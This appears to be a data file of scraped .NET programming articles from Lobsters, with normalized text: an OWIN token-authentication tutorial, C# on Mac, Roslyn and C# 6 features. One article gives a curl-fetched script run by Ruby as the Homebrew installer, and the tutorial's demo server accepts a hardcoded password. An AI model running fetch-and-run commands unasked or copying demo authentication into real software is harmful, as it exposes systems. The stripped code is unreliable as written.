systemcollectionsgeneric using systemlinq using systemtext using systemthreadingtasks add using using systemnethttp namespace minimalowinwebapiclient class program static void main string args wait async stuff run run wait write done consolewriteline consolewriteline done press enter key exit consolereadline return static async task run create http client provider string hosturistring http var provider new apiclientprovider hosturistring string accesstoken dictionary string string tokendictionary try pas credential retrieve token dictionary tokendictionary await providergettokendictionary john examplecom password accesstoken tokendictionary accesstoken catch aggregateexception ex aggregate exception async error occurred consolewriteline exinnerexceptions message consolewriteline press enter key exit consolereadline return catch exception ex something else happened consolewriteline exmessage consolewriteline press enter key exit consolereadline return write content dictionary foreach var kvp tokendictionary consolewriteline kvpkey kvpvalue consolewriteline point ditched code make request companiescontroller api looking code authenticates u retrieves access token note included rudimentary exception handling real application would probably want little info would need incorporate robust mechanism handling http error thing might go wrong run web api application run client application see following output client application client application output authentication see successfully retrieved access token extrasimple auth server pas invalid credential change password passing password something else say assword mom take letter p client application invalid authentication appropriately get back error indicating provided invalid grant let implement rest client try call api implementing api client authenticated api call add updated version companyclient class case made everything async also updated class method work new authentication requirement introduced api heavily modified companyclient class using system using systemcollectionsgeneric using systemlinq using systemtext using systemthreadingtasks add using using systemnethttp using systemnet using systemnethttpheaders add identitytoken deserialization using newtonsoftjson namespace minimalowinwebapiclient public class companyclient string accesstoken uri baserequesturi public companyclient uri baseuri string accesstoken accesstoken accesstoken baserequesturi new uri baseuri apicompanies handy helper method set access token request void setclientauthentication httpclient client clientdefaultrequestheadersauthorization new authenticationheadervalue bearer accesstoken public async task ienumerable company getcompaniesasync httpresponsemessage response using var client new httpclient setclientauthentication client response await clientgetasync baserequesturi return await responsecontentreadasasync ienumerable company public async task company getcompanyasync int id httpresponsemessage response using var client new httpclient setclientauthentication client combine base address uri id new uri look like http hosturlapicompaniesid response await clientgetasync new uri baserequesturi idtostring var result await responsecontentreadasasync company return result public async task httpstatuscode addcompanyasync company company httpresponsemessage response using var client new httpclient setclientauthentication client response await clientpostasjsonasync baserequesturi company return responsestatuscode public async task httpstatuscode updatecompanyasync company company httpresponsemessage response using var client new httpclient setclientauthentication client response await clientputasjsonasync baserequesturi company return responsestatuscode public async task httpstatuscode deletecompanyasync int id httpresponsemessage response using var client new httpclient setclientauthentication client combine base address uri id new uri look like http hosturlapicompaniesid response await clientdeleteasync new uri baserequesturi idtostring return responsestatuscode update program class call companyclient work api output result console basically expand run method exercise method defined companiescontroller asynchronously also added pair convenience method writing console writecompanieslist writestatuscoderesult update program class consume api write console static async task run create http client provider string hosturistring http var provider new apiclientprovider hosturistring string accesstoken dictionary string string tokendictionary try pas credential retrieve token dictionary tokendictionary await providergettokendictionary john examplecom password accesstoken tokendictionary accesstoken write content dictionary foreach var kvp tokendictionary consolewriteline kvpkey kvpvalue consolewriteline create company client instance var baseuri new uri hosturistring var companyclient new companyclient baseuri accesstoken read initial company consolewriteline read company var company await companyclientgetcompaniesasync writecompanieslist company int nextid c company select cid max consolewriteline add new company var result await companyclientaddcompanyasync new company name stringformat new company nextid writestatuscoderesult result consolewriteline updated list add company await companyclientgetcompaniesasync writecompanieslist company consolewriteline update company var updateme await companyclientgetcompanyasync nextid updatemename stringformat updated company updatemeid result await companyclientupdatecompanyasync updateme writestatuscoderesult result consolewriteline updated list update company await companyclientgetcompaniesasync writecompanieslist company consolewriteline delete company result await companyclientdeletecompanyasync nextid writestatuscoderesult result consolewriteline updated list delete company await companyclientgetcompaniesasync writecompanieslist company catch aggregateexception ex aggregate exception async error occurred consolewriteline exinnerexceptions message consolewriteline press enter key exit consolereadline return catch exception ex something else happened consolewriteline exmessage consolewriteline press enter key exit consolereadline return static void writecompanieslist ienumerable company company foreach var company company consolewriteline id name companyid companyname consolewriteline static void writestatuscoderesult systemnethttpstatuscode statuscode statuscode systemnethttpstatuscodeok consolewriteline opreation succeeded status code statuscode else consolewriteline opreation failed status code statuscode consolewriteline able properly authenticate request web api protected unauthorized access right fast protecting resource authorize attribute fire web api application open browser type url routed getcompanies method companiescontroller find still access resource even though request browser contains authentication token accessing company resource browser without authentication specified resource represented companiescontroller protected fix easily decorating companiescontroller class authorize attribute decorate companiescontroller authorize attribute authorize public class companiescontroller apicontroller code company controller rerun web api application refresh browser find accessing protected company resource browser without authentication since browser request access token request body request protected resource denied accessing protected resource authenticated client request able run api client application forget reset password password run client application see console output resembling following console output authenticated request protected resource implemented basic example authenticating user embedded authorization server retrieved access token client application successfully requested access protected resource resource server adding role claim deep look claimsbased authorization beyond scope article however use authorize attribute ensure user specific role claim access protected resource change authorize attribute companycontroller class following add specific role authorize attribute company controller authorize role admin public class companiescontroller apicontroller code company controller run web api application run api client application find problem running api client role authorization required given added role restriction access companiescontroller resource expect see let see authorizing access based role membership web api add role claim resource owner identity simplest level add claim access token granted resource owner call grantresourceownercredentials add role claim authenticated user grantresourceownercredentials public override async task grantresourceownercredentials oauthgrantresourceownercredentialscontext context demo pretend sort real checking contextpassword password contextseterror invalidgrant user name password incorrect contextrejected return create retrieve claimsidentity represent authenticated user claimsidentity identity new claimsidentity contextoptionsauthenticationtype identityaddclaim new claim username contextusername add role claim identityaddclaim new claim claimtypesrole admin identity info ultimatly encoded access token result call contextvalidated identity simple change added claim identity authenticated user claim encodedencrypted part access token token received resource server case application decoded token provide identity authenticated user well additional claim including fact user member admin role run application console output api client application would expect console output client authenticated user proper admin role claim successfully accessed protected resource access companiescontroller restricted authenticated user also present claim indicating member admin role next far seen basic way resource owner flow implemented context owinkatana pipeline yet examined might store user information get authorization framework might access data next post look persisting authorization information access next aspnet web api owinkatana authenticationauthorization part ii model persistence additional resource item interest helpful article referred learning stuff john googlecodeproject
583,Lobsters,dotnet,"C#, F#, .NET programming",DuoCode is a C#-to-JavaScript compiler powered by Microsoft Roslyn,http://duoco.de/,duocode c tojavascript compiler powered microsoft roslyn,,bluehostcom right reserved
584,Lobsters,dotnet,"C#, F#, .NET programming",10 Free ebooks on Windows Phone and Windows Store app development,http://superdevresources.com/free-ebooks-windows-phone-windows-store-app-development/,free ebooks window phone window store app development,free ebooks download code sample free ebooks window app development microsoft virtual academy creating mobile apps xamarinforms download pdf epub mobi microsoft platform tool mobile app development download pdf epub mobi programming window store apps html cs javascript edition detail download pdf epub mobi code sample location intelligence window store apps detail download pdf code sample window phone development absolute beginner window phone development succinctly download pdf kindle format net technology guide business application detail download pdf window phone programming c download pdf developing advanced window phone app connects cloud download pdf programming window phone detail download pdf epub mobi code sample net book zero detail download pdf xps code sample c programming yellow book rubber duck edition detail download pdf share,ebooks great way learn free time downloaded free ebooks developing apps window platform post tried collect known free ebooks window phone window store app development including window universal platform xamarin find direct link download available multiple format like pdf mobi epub etc link download code sample also included wherever available free ebooks window app development tend keep list uptodate latest released book find many free ebooks microsoft press microsoft virtual academy creating mobile apps xamarinforms author charles petzold page written legendary author charles petzold ebook deep dive c programmer want write application using single code base target three popular mobile platform io android window encompassing universal window platform window phone download pdf epub mobi microsoft platform tool mobile app development author cesar de la torre simon calvert page book outline platform microsoft form critical capability organization selecting technology tool mobile application development platform madp rapid mobile application development rmad also describes core decision factor organization consider outline technical capability available within microsoft solution product download pdf epub mobi programming window store apps html cs javascript edition author kraig brockschmidt page indepth ebook writing window store apps using html javascript window platform ebook includes chapter appendix detail download pdf epub mobi code sample location intelligence window store apps author ricky brundritt page dive world location intelligence different option creating location aware application window platform detail download pdf code sample window phone development absolute beginner window phone development succinctly author matteo pagani page free ebook syncfusion cover important concept develop window phone application basic one like xaml application lifecycle etc advanced one like background task geolocalization speech apis download pdf kindle format net technology guide business application author cesar de la torre david carmona page guide help select right microsoft development technology approach custom net application development depending priority application business domain targeted decision maker software architect development lead developer involved selecting technology use application project specifically cover custom enterprise application development although independent software vendor isvs might also find information recommendation useful detail download pdf window phone programming c author rob mile page book tell develop application game using xaml xna using monogame serve good introduction window phone development experienced c developer download pdf developing advanced window phone app connects cloud author david britch francis cheung adam kinney rohit sharma page get familiar design implement advanced application window phone take advantage remote service obtain upload data providing great user experience device download pdf programming window phone author charles petzold page slightly old one core concept still relevant learn basic writing application window phone using c programming language silverlight xna framework detail download pdf epub mobi code sample net book zero author charles petzold page ebook introduction c microsoft net framework programmer experience c c would serve foundation developing window phone window store apps c detail download pdf xps code sample c programming yellow book rubber duck edition author rob mile page c yellow book used department computer science university hull basis first year programming course provided free cost author rob mile detail download pdf let wealth knowledge get lost hit share button tell fellow developer know free ebooks available window app developer let u know make sure update list
585,Lobsters,dotnet,"C#, F#, .NET programming",Write C# on a Mac like a Champ!,http://developer.telerik.com/featured/write-c-mac-like-champ/,write c mac like champ,net going open source window find perfect host lenovo yoga pro surface pro bootcamp run window intelbased mac bootcamp assistant virtual machine parallel vmware fusion telerik devcraft visual studio monaco editor channel video series sign free window azure management portal github visual studio online let rock aspnet net framework core open sourced future net aspnet vnext improved tooling kruntime getting ready net vnext home github node npm homebrew k version manager kvm mono mono github k runtime environment kre yeoman running aspnet omnisharp omnisharpnet sublime text sublime text make c firstclass citizen beta sublime text sublime text package manager plugin installed kulture plugin omnisharp plugin c language specific setting omnisharpserver nancy wonderful post conclusion mircea,let face apple make desired notebook industry macbook pro retina loved many developer screen real estate silent robust performance macbook air hand offer portability long battery life productivity one know alone love notebook glowing fruit microsoft stack developer may want use mac development machine write c code even possible alternatively may always mac developer interested net going open source want try native aspnet osx either way goal marry two best thing developer quality mac hardware c comfort good news happily coexist let talk option article window find perfect host always good see innovation pc manufacturer like recent beautifully thin lenovo yoga pro mention microsoft tablet convertible surface pro selling like hot cake also secret macbooks make wonderful laptop running full window o added bonus macbook pro retina laptop window installation enjoys high resolution see image window running mac developer love screen real estate even expense squinting eye right two way run window mac bootcamp apple way allowing run window intelbased mac simply use builtin bootcamp assistant make partition install window done easily boot window instead osx reuse io inputoutput driver peripheral mode window running natively metal get full performance benefit course mean install visual studio write c day window machine virtual machine choosing o boot nt cup tea option run window virtual machine vm osx acting host o dedicated software heavy lifting vm like managing virtualization memory peripheral parallel vmware fusion two excellent option running window vms mac customizable virtualization resource finetuning option easy switchability windowsosx rocking window running vm time easily install visual studio inside window vm write c heart content whether go bootcamp vm running full window mean get benefit telerik devcraft supercharge net productivity type application building visual studio monaco editor although fully baked yet c get new ubiquitous code editor yes browser browser across o c browser come courtesy special lightweight editor codenamed monaco launched visual studio quote microsoft monaco want provide developer lightweight friction free companion visual studio desktop ide accessible device platform monaco rich browser based code focused development environment optimized window azure platform making easy start building maintaining application cloud check channel video series get started visual studio online monaco editor well keeping latest enhancement want try monaco editor today well really geared work site hosted window azure absolutely write c codebehind code serverside hook code source control perform buildsdeployments get started first need window azure account sign free log window azure management portal create new azure website big sign bottom left open website configuration turn option edit visual studio online website dashboard click edit visual studio online link enjoy c edits browser step visually starting creating azure website choose azure subscription hosting appropriately next navigate newly created website dashboard click configure tab scroll little configuration see edit visual studio online setting turn see magic back website dashboard link edit visual studio online light go ahead click link voila new page open lightweight code edits window azure website see added new testcs file able write c code chrome browser mac cool also hook website project github visual studio online source control done monaco editor show project explorer file double click edit visual studio monaco editor also support large number shortcut keyboard command editing htmlcssjavascript find visual studio monaco editor rather smart intellisense c experience keep improving every release also find solid support online editing le php nodejs typescript done edits browser simply fire build see output console window even run azure website pick change effect build full aspnet website browser including writing c browser running mac osx let rock aspnet saved best last since going fun writing c mac building modern webmobile application aspnet may already heard net framework core open sourced future net modular crossplatform rather exciting aspnet vnext lead way open source offering improved tooling along flexible hosting outside ii using new kruntime using core crossplatform net framework aspnet web application run everywhere yes mean natively osx mac getting ready start rocking c mac build next aspnet vnext application thing set environment get handy package let walk step first visit net vnext home github make sure understand moving piece check minimum system requirement net vnext architecture modular using several package component let get prerequisite way first install latest version node come bundled ubiquitous package manager npm homebrew another excellent open source package manager allows installmanage software normally via osx terminal install homebrew well entering following ruby code terminal ruby e curl fssl http rawgithubusercontentcomhomebrewinstallmasterinstall tap aspnet vnext related git repository using homebrew like brew tap aspnetk next install k version manager kvm use kvm install switch different aspnet runtimes simply fire brew command note step install mono osx already present alternatively always manually pull mono github build aspnet runtime mac depends mono brew install kvm kvm set next step would install latest k runtime environment kre formalize k command like kvm upgrade source kvmsh previous step technically ready run aspnet vnext natively mac handy tool help line starting yeoman yeoman sleek open source scaffolding tool yes work aspnet project grab yeoman aspnet yeoman generator follows npm install yo npm install generatoraspnet running aspnet ready start building aspnet vnext web application osx let start running yeoman aspnet scaffolding tool within appropriate project folder like yo aspnet see glimpse expected behavior case aspnet mvc application scaffolding requested navigate directory ran scaffolding voila exact project structure requisite file seen created aspnet mvc web project using visual studio aspnet project set run mac kvm command line come play simply navigate aspnet project directory terminal run following command resolve missing package dependency kpm restore finally use mono runtime host aspnet web application simply fire following command k kestrel terminal console show message indicating site started simply pull browser navigate http shown aspnet running localhost chrome mac like first time see native aspnet web application running mac whoa moment omnisharp well point fully scaffolded aspnet web application running natively mac may still need little help get cracking working website code especially writing lot c serverside code enter marvelous omnisharpnet may adventurous run net application osx linux practical write c code outside comfort visual studio omnisharp help quote omnisharp family open source project one goal enable great net development editor choice extends nonwindows editor like sublime text atom emacs bracket vim yep write c editor choice sublime text let talk use one popular option sublime text want write c sublime text get benefit expect visual studio turn effort underway make c firstclass citizen editor like sublime text simple step set sublime text writing c aspnet application download beta sublime text make sure latest sublime text package manager plugin installed install kulture plugin package control install omnisharp plugin package control make c language specific setting provide appropriate intellisense event trigger needed open yeoman scaffolded aspnet vnext project osx directory sublime text point root folder sublime show file project tree perfectly editable open create new c file start typing boom visual studio like intellisense type inside sublime text shown even try context specific dot operator c get intellisense contextual code completion prompt seen wonder working sublime text editor courtesy omnisharpserver omnisharpserver local web server written nancy accepts request various different endpoint return result code sent example sublime text string variable type variable name request sent omnisharpserver specific payload response contains possible completion variable nrefactory c analysis library used omnisharpserver allows application easily analyze syntax semantics c program quite similar microsoft roslyn project except full compiler nrefactory analyzes c code generate il code sound complicated get reap benefit open source community work omnisharpnet microsoft endorsement essentially type c code locally hosted omnisharp server heavy lifting trying provide contextual intellisense stopping short actually compiling code get write c editor choice complete visual studio like code editor feature sublime text get enjoy feature like intellisense go definition rename find usage go implementation format document override add reference syntaxsemantic error code refactoring build solution many check wonderful post expect writing c sublime text complete gifs demonstrating interaction conclusion choice good thing developer popular net language one best possible laptop seems like solid match pick work best vm browser native editor omnisharp bottom line write c mac like champ today fun time indeed header image courtesy mircea
586,Lobsters,dotnet,"C#, F#, .NET programming",Roslyn in a Nutshell,http://developer.telerik.com/featured/roslyn-nutshell/,roslyn nutshell,landing page getting started visual studio preview download source code src see compiler cscexe blog post taking look hood semanticmodels next step exploring roslyn documented justcode web desktop mobile application stephen nakatani,roslyn made opensource c visual basic compiler code analysis apis microsoft development stack people realize roslyn came october preview worked visual studio several change since really took spotlight build conference held microsoft opensourced made available visual studio fast forward today see landing page visual studio front center roslyn post walk sample found helpful wrap head around roslyn getting started one easiest way get started roslyn downloading visual studio preview installing recommend using virtual machine order navigate roslyn project download source code folder several file folder concerned one named src go ahead navigate shown double click roslynsln file project load upon first launch go ahead build solution navigate one directory back see binary navigate inside debug shown see compiler anyone used c familiar cscexe check date created see compiled version cool help go ahead run csc command prompt see following c usersmichaeldocumentsvisual studio csc microsoft r visual c compiler version copyright c microsoft corporation right reserved warning source file specified error output without source must option specified c usersmichaeldocumentsvisual studio nothing surprise specify source file compiled really interesting ability look source code understand warning error message generated search text output without source must option specified could find source code pull error message case coming resourcemanager class want actually change way compiler behaves read c program check blog post demonstrates anders hejlsberg added support french quote c compiler line code taking look hood go ahead download following file installed open visual studio preview navigate compiler platform console application template shown project spin notice several reference added primarily working microsoftcodeanalysis namespaces add following code main method public static void main string args syntaxtree tree csharpsyntaxtreeparsetext using system using systemcollectionsgeneric using systemtext namespace helloworld class program static void main string args consolewriteline hello tdn var root compilationunitsyntax treegetroot var compilation csharpcompilationcreate hellotdn addreferences reference new metadatareferencecreatefromassembly typeof object assembly addsyntaxtrees tree set breakpoint last curly brace turn roslyn syntax visualizer going view window roslyn syntax visualizer see following blank moment run application scroll top document click syntaxtree declared code take proper node view vast variety information example taking look leading trailing whitespace course dig deeper learn exactly going behind scene app seen example compilation compilation abstract class languagespecific derivative semanticmodels seen compilation ask semanticmodel syntaxtree contained compilation microsoft describes semanticmodels something queried answer question like name scope location member accessible method variable used block text nameexpression refer simple example could achieved following code var model compilationgetsemanticmodel tree var nameinfo modelgetsymbolinfo rootusings name var systemsymbol inamespacesymbol nameinfosymbol foreach var n systemsymbolgetnamespacemembers consolewriteline nsname sample create model using getsemanticmodel method passing tree defined earlier declare another variable called nameinfo bind using system namespace pull system member console window congrats successfully bound name find symbol next step exploring roslyn hope give quick look powerful roslyn actually writing article came across lot documentation outdated look like community quickly fixing adding feature nt dug binding expression syntax transformation diagnostics thankfully documented telerik already working roslyn releasing new version justcode visual studio take advantage enhancing developer productivity still great control web desktop mobile application ready go visual studio released thanks taking time read comment link share feel free leave header image courtesy stephen nakatani
587,Lobsters,dotnet,"C#, F#, .NET programming",Why F# became my goto language,https://mrange.wordpress.com/2014/12/20/why-fsharp-became-my-goto-language/,f became goto language,register log,site marked private owner would like view need two thing wordpresscom account account need email address password register permission site owner created account log revisit screen request inviteif already great log
588,Lobsters,dotnet,"C#, F#, .NET programming",What's New in C# 6.0 inside Visual Studio 2015 Preview,http://developer.telerik.com/featured/whats-new-c-6-0-inside-visual-studio-2015-preview/,new c inside visual studio preview,uptodate guide visual studio preview feature visual studio window technical preview diving foot first visual studio preview build advanced github static using syntax autoproperty initializers dictionary initializers exception filter async catch finally block exception filter async catch finally block nameof expression string interpolation conclusion http msdnmicrosoftcom visual studio preview web desktop mobile application aspnet wpf window universal apps collection,created uptodate guide detail feature final version c install visual studio preview begin exploring new language feature found c nt many change language previous version c several feature aware post cover language enhancement c case missed also wrote another post top feature visual studio well several nugget found exploring window technical preview may interesting developer diving foot first make sure downloaded visual studio preview create new c console application shown nt worry changing net framework version number one thing note default writing c ever need change simply go project property click build advanced change language version whatever want indicated since going writing c leave setting default manually select c follow along tutorial complete visual studio console application including demo shown article found github let get started static using syntax previous version c would need add proper using statement systemconsole could write following line code consolewriteline hello tdn c add using statement reference writeline method shown using systemconsole namespace tdncsharpsix class program static void main string args sample one writeline hello tdn autoproperty initializers past may created property get set initialized constructor value wanted shown public class customer public customer customerid guidnewguid public guid customerid get set reduce code block one line shown longer need create setter constructor public class customer public guid customerid get set guidnewguid dictionary initializers many c developer felt format shown confusing creating dictionary mainly use bracket quotation mark data dictionary string string customernames new dictionary string string michael jordan basketball peyton manning football babe ruth baseball compiler team decided change make readable following format new format save keystroke much easier read opinion public dictionary string string customernames new dictionary string string michael jordan basketball peyton manning football babe ruth baseball exception filter async catch finally block exception filter exception filter supported visual basic new c compiler allow specify condition catch block shown following sample last catch statement fire try throw new exception error catch exception ex exmessage reallybaderror one execute catch exception ex exmessage error one execute writeline one execute async catch finally block think many developer love feature often need log exception file database without blocking current thread example one would work public static async void downloadasync try throw new exception error catch await taskdelay writeline waiting second finally await taskdelay writeline waiting second nameof expression many time code retrieve name member class would typically wrap field quotation mark shown public static void dosomething string name name null throw new exception name main problem force put string code represent name member c new operator called nameof allow u refactor code remove string literal sample shown demonstrate could refactor method public static void dosomething string name name null throw new exception nameof name result cleaner code safety retrieving member name string interpolation prior c typically concatenate two string together one following way string firstname michael string lastname crump writeline name firstname lastname writeline stringformat name firstname lastname c cleaner format shown first writeline call also put expression directly string literal evaluate expression shown string firstname michael string lastname crump int ordernumber writeline name firstname lastname writeline name firstname lastname ndiscount ordernumber get order sample console return following evaluated ordernumber equal otherwise would printed anything michael crump discount get order conclusion look like c starting take shape preview released touched several favorite language feature obviously could nt include also aware anything wrote subject change saw several language feature removed visual studio ctp would encourage keep watch http msdnmicrosoftcom updated information telerik already experimenting visual studio preview bet control web desktop mobile application ready go new ide released feel free download explore aspnet wpf window universal apps ui suite well take look overall collection
589,Lobsters,dotnet,"C#, F#, .NET programming",To .NET or not to .NET: That is the Question,http://fullstack.info/to-dotnet-or-not-to-dotnet-that-is-the-question,net net question,confused praise net disenchantment sort accept pull request already written part blogged net revolution collateral stuff net core library vms reversim podcast hebrew confused long time think future look bright net horse left barn already nix guy consider net option monetary ip obstacle almost gone larry ewing,confused many year net microsoft stack developer might call net simplicity mean window asp net ii sql server etc family product religious reason corporate mind business constraint like others might merely random coincidence led start developing visual basic continue later version rest history praise net throughout year always read cool guy use unix linux ruby python younameit use vim hack thing quickly open source software community large full contributing people tool framework robust fast somehow never got mean question fact always saw degree still net stack strong rich robust superb tooling primarily visual studio well documented especially recent year blast microsoft party library tool framework emerged made net even greater many tool inspired linux although creator would hardly admit name completely random order importance aspnet mvc chocolatey nuget entity framework nancy web api powershell window server course many smaller tool enriched ecosystem like nunit resharper web essential github window dapper lucenenet autofac cmder hundred project mention tool originated net superior octopus deploy hangfire xamarin signalr always feeling miss anything net stack tool robustness cool kid bash net cool least think issue agreed throughout whole time using windowsnet ecosystem incurs licensing cost nix free argument even clearcut since free stuff get enterprise support etc know argument originates m marketing subjective enter much point right disenchantment sort despite saw disturbing picture microsoft code open source finally began open source project year ago accept pull request amount good library framework nix way larger window internet explorer even get started rant already written part benchmark claim ii performs way worse nginx shell truth must told powershell huge step forward still lag behind shbash term console robustness ease speed use window user still changed state mind towards working shell using keyboard guidestutorialsq explain carry given task ui screenshot step open program click choose list etc whereas command line version would usually oneliner something actually copypaste reuse work missing step window changed location version etc started see movement netwindows veteran nix blogged new thing mainly gained acceleration last year least according impression people said many thing netmicrosoft favor nix beginning thought nerdish thing microsoft cool linux let hack thing faster window insecure nature microsoft get idea free software still charge fortune heard people saying moved lamp stack feel set free still quite get said net ecosystem robust constantly improving fully supported slowly began realize subtle truth like argue someone one quite listen party get point mentally zoom argument try objective judge right regardless personal view ego start seeing party view find wrong follow dozen podcasts blog natively many speak net come filter speak software design general entrepreneurship lean startup hackathons everything corporate world hardly speak net hate net laugh day care hack thing pythonnodegometeor mentioning ror recently become uncool fast boot thin linux vms docker container deploy heroku google appengine lean linux vm digitalocean one mean architecture robust database framework tooling need free robust use production environment look early mature startup code linux stack ok made exact number hard find good net engineer silicon valley nowadays nodejs running linux due cost although perfectly run window well cool kid part known mean stack hear net development belongs old traditional corporate world whereas really lean agile mvp stuff done mean previously lamp net revolution hand wind change emerge redmond giant increase every week change began microsoft started open source net stack continued introduction microsoftinitiated open source organization like outercurve m open tech started see significant contribution famous open source project organization microsoft finally began accept pull request collateral stuff beginning net core library introduction net vnext microsoft deny linux existence acknowledge existence pretty sure marketing department forced change paradigm help significant inside political force even officially offer linux vms microsoft azure time writing vms running microsft azure linux docker going supported window announcement net vnext skyrocketed everything microsoft iteratively build net code linux mac o orphan helloworldcapablebutnotreallyforproduction mono project finally net project bound proprietary csproj file project parsed according physical folder content fully portable including net framework version run close gap stack framework mentioned earlier really fast net guy today look much brighter yesterday year ago felt ashamed corporateworld net guy recently feel much elaborated bit month ago reversim podcast hebrew confused still know though whether step microsoft take late microsoft trying catch market realizing sticking tradition unique way thinking building product missed market microsoft default probably default among desktop user personal business browser long time server development stack big question whether microsoft succeed catching stop flow developer moving linux even reverse trend another obscure fact whether net linux mac o indeed work like window counterpart despite genuine intent microsoft really provide fully compatible version know actually happen really religious choosing development stack although naturally happen net guy rich career back open whatever best suit task hand next web gig unless see clear advantage framework namely nodejsexpress meteor go pythondjango aware different strength role client andor server see reason net stack serverside web application client side completely different story think future look bright net horse left barn already nix guy consider net option monetary ip obstacle almost gone tux image courtesy larry ewing
591,Lobsters,dotnet,"C#, F#, .NET programming",5 Incredible Features in the Visual Studio 2015 Preview,http://developer.telerik.com/featured/5-incredible-features-visual-studio-2015-preview/,incredible feature visual studio preview,visual studio preview every custom window layout better code editor justcode justcode visual studio shared project thing intellisense bower npm dependency bowerjson configjson debug lambda bonus tip blend visual studio actually rock xaml intellisense awesomeness coming visual studio telerik described devcraft suite telerik platform window post sam basu future net,visual studio preview included many new feature enhanced way developer work everything web desktop mobile apps several feature spotlight gesture support editor cordova tooling c enhancement new android emulator several le talked feature feel every developer us visual studio benefit said let jump straight custom window layout feature come handy develop multiple device say example use surface pro develop train ride home monitor day quickly switch device going window apply window layout selecting one created earlier also support keyboard shortcut quickly navigate favorite layout profile roams long signed visual studio example switching surface device desktop monitor notice surface want show xaml file whereas large monitor want see everything better code editor code editor replaced roslyn give new improved code editing experience light bulb shown need include fix code refactor whenever see light bulb appear click give suggestion based upon code analyzed sample determined included unnecessary using statement help remove generate preview change affect whole document project solution feature appeared justcode earlier version visual studio year releasing new version justcode visual studio take advantage rosyln enhanced productivity tool shared project thing many time wanted use shared project outside window universal app open visual studio search shared see following go ahead select visual c shared project create class named personcs add following code class person public string firstname get set public person firstname michael create new console application reference shared project created write code var person new person consolewriteline personfirstname consolereadline run console app see retrieved firstname shared project go ahead add wpf window form application access person class like normally would also work class library well added several project solution explorer look like following notice thing reference shared project intellisense bower npm create new aspnet web project notice several thing new project template load shown besides updated file structure folder called dependency contains bower npm generally speaking think bower clientside package jquery angular npm developer tool grunt gulp package manager controlled json file found solution bowerjson bower configjson npm wanted add library using bower would simply open bowerjson file add package want case want add latest version angular without go angular site manually download add project added see option installupdate delete package view homepage dropdown menu come handy working web project debug lambda yes time finally come debug lambda expression let take look following code list int element new list int find index first odd element int oddindex elementsfindindex x x consolewriteline oddindex console return value wanted add watch perform additional analysis expression shown sample added watch breakpoint added following code elementswhere v int v toarray expected returned item greater lot help use immediate debugger window well also supported c visual basic bonus tip blend visual studio actually rock blend come several enhancement far one needed overhaul ui shown quickly find blend includes functionality grown love visual studio notible feature basic debugging support peek xaml custom window layout shown feature source control nuget finally xaml intellisense minute playing new blend tell microsoft committed making blend experience similar visual studio one awesomeness coming visual studio telerik far seen first preview visual studio new feedback option assume get better since release playing new bit described looking way enhance web desktop mobile application take look devcraft suite also encourage take look telerik platform crossplatform mobile application using javascript also missed featured sound comment love hear feedback pretty vocal window post need get speed everything happened net past couple week suggest read sam basu post future net next time michael signing
592,Lobsters,dotnet,"C#, F#, .NET programming","OmniSharp - Making cross-platform .NET a reality, and a pleasure",http://www.hanselman.com/blog/OmniSharpMakingCrossplatformNETARealityAndAPleasure.aspx,omnisharp making crossplatform net reality pleasure,announcing net net open source net mac linux visual studio community omnisharp video channel like http githubcomomnisharp http wwwomnisharpnet jonathan channon great overview blog post jason imison omnisharpserver omnisharp nancy sublime kulture package kestrel example new aspnet design time host jonathan writeup great animated gifs showing feature yeoman generator aspnet http omnisharpnet hosting,case missed make sure read announcing net net open source net mac linux visual studio community big stuff going summary net wave awesomeness thing wanted talk newly organized group technology called omnisharp sure confusion omnisharp nt microsoft project two microsoft folk team working community member official capacity launched project talk connect miniconference new york week back watch video channel like however technology around omnisharp around year like decade team community pulled together bunch project plugins got organized created http githubcomomnisharp http wwwomnisharpnet jonathan channon great overview blog post check talk jason imison created omnisharpserver http wrapper around nrefactory allowing c editor plugins written language nrefactory c analysis library used sharpdevelop monodevelop ides allows application easily analyze syntax semantics c program quite similar microsoft roslyn project except full compiler nrefactory analyzes c code generate il code omnisharp run process run local nancybased web api editor choice talk editor like use get involved make plugin perhaps eclipse plugins editor sublime bracket adobe atom github emacs vim work far platform choice wanted bring autocomplete basically think typed editor instead want actual typesmart intellisense well sophisticated feature like refactoring format document lot stuff expect see visual studio also brought sublime kulture package give sublime user support aspnet formerly aspnet vnext launch kestrel libuv based local webserver run entity framework migration arbitrary command within sublime omnisharp running emacs window machine emacs setup example little complex others also give emacs folk extreme level control note launch omnisharp server manually emacs launch automatically editor aspnet mvc app running sublime sublime omnisharp package output seen debug console ctrl see omnisharp active development looking bringing roslyn using new aspnet design time host improving robustness perfect pretty darn cool lot detail jonathan writeup great animated gifs showing feature also note yeoman generator aspnet get started creating aspnet apps mac linux yeoman generator create console apps mvc apps nancyfx apps get started http omnisharpnet see hosting
593,Lobsters,dotnet,"C#, F#, .NET programming",Building Dating Site at HappyPancake,http://abdullin.com/long/happypancake/,building dating site happypancake,,
594,Lobsters,dotnet,"C#, F#, .NET programming",C# and .NET's Sudden Ubiquity,http://www.drdobbs.com/windows/c-and-nets-sudden-ubiquity/240169282,c net sudden ubiquity,onion microsoft announced sweeping change tool division usable incomplete porting solution apache cordova platypusguy google,headline read like imaginative claim april fool story satirical sortie onion microsoft opensources full net stack microsoft port net linux mac o microsoft boost free tool version compete evenly paid edition true today microsoft announced sweeping change tool division make advance earlier year look like minor event announcement view important far commitment put net major platform microsoft handle delivering net linux mac o depend tighter cooperation xamarin address mobile sector platform linux clearly important today microsoft earns much record profit enterprise software package sql server sharepoint exchange etc running net linux ability run apps significant majority server platform except solaris site enterprise able run application without add cost microsoft server license perhaps important pure server benefit cloud aspect vms cloud especially public cloud principally linuxbased window vms available consistently higher pricing move net apps run anywhere cloud said another way server cloud apps run anywhere operating port mac o certainly le needed mac already run window quite well via parallel virtualization technology expect move designed broaden desktop coverage net attract work growing number developer prefer work macbooks go developer conference hackathon opensource gathering majority laptop see nt mean mere plurality rather overwhelming majority final piece puzzle net mobile device filled xamarin sell usable incomplete porting solution announcement today microsoft promised closer cooperation xamarin team bodes well although remains mystery microsoft yet bought company hardpressed think obvious acquisition tech company add development mobile apps nt need native visual studio already tool next update due imminently add tooling apache cordova well android emulator big winner goodness c developer theory net portability favor net language equally secret c first among equal f fact language xamarin support currently microsoft excellent steward language evolving intelligently remarkably cleanly among developer use regularly uniformly well liked distinguishes major development language today appreciation border ambivalence common experience big loser certainly java java stock trade longstanding ability run without modification recompilation major platform valuable trait major competition enterprise microsoft port net provides multiplatform experience smooth seamless java jvm serious competition moreover come pas net key advantage java support client despite significant improvement javafx delivers swing java one first choice writing desktop uis whereas net standard business application year c attractive language developer blocked wider adoption inability run window today announcement whole new world open nearly 